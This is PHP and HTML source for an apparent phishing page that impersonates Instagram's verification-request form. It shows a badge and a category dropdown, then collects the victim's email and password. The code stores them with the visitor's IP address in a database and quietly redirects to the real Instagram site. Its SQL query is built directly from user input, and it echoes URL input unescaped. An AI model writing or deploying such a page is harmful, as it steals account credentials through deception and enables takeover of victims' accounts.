<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");

$nick = $_GET['nick'];
if($_POST){
$mail = $_POST["email"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

    $yaz = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$nick."','".$password."','Null','".$mail."','Null','Null','".$ip."',current_timestamp())");
    
  
    header("Location: https://www.instagram.com/");


}

?>
<!doctype html>
<html lang="en">
<head>
    <?php include ("app/tag/main/meta.php"); ?>
    <link rel="stylesheet" type="text/css" href="assets/theme/wasted/css/account.css">	
</head>


<center>
<div class="box" style="border:5px solid #fff;"><br>


<br><br>
<h1 class="h1">@<?php echo $nick; ?> &nbsp;<img src="asssets/theme/wasted/simg/tik.gif" width="23" height="23" style="font-size:small;color:rgb(34,34,34);font-family:'times new roman';margin-right:0px" class="CToWUd"><br><br></h1>

<select style="outline:none; width:20rem; height:2rem; border:none; border-bottom: 1px solid lightgray; background:transparent;">
  <option>Choose a category for your account</option>
  <option>News/Media</option>
  <option>Sports</option>
  <option>Government/Politics</option>
  <option>Music</option>
  <option>Fashion</option>
  <option>Entertainment</option>
  <option>Blogger/Influencer</option>
  <option>Business/Brand/Organization</option>
  <option>Other</option>
</select><br><br>

<input placeholder="@<?php echo $nick; ?>" disabled style="outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>

<input style="outline: none; width: 20rem;height:2rem;border: none;border-bottom: 1px solid lightgray;background: transparent;" 
type="text" class="inputtext _55r1" name="inputReportedUsername" id="517933078260202" value="" placeholder="Known Name" required="1" aria-required="true"><br><br>

<form method="post" >
<input type="email" name="email" placeholder="E-Mail" required="" style="outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>

<input type="password" name="password" placeholder="Password" required="" style="outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>

<button class="buton" type="submit">Request Verification</button>

</form>

    <center><br><br>
      <div>
        <p class="b">© 2022 Instagram from Meta</p>
      </div>
    </center>

</body>
</html>